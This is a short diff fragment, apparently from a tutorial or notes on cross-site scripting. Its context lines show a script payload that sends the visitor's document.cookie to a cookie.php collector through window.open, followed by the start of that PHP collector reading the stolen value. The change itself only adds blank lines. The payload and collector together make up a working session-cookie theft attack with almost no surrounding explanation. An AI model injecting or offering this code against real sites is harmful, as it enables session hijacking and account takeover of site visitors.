@@ -3,6 +3,9 @@
   url="http://127.0.0.1/cookie.php?data="+document.cookie;window.open(url, width=0, height=0);
 </script>
 
+
+
+
 //cookie.php소스
 <?
   $cookie=$_GET['data'];
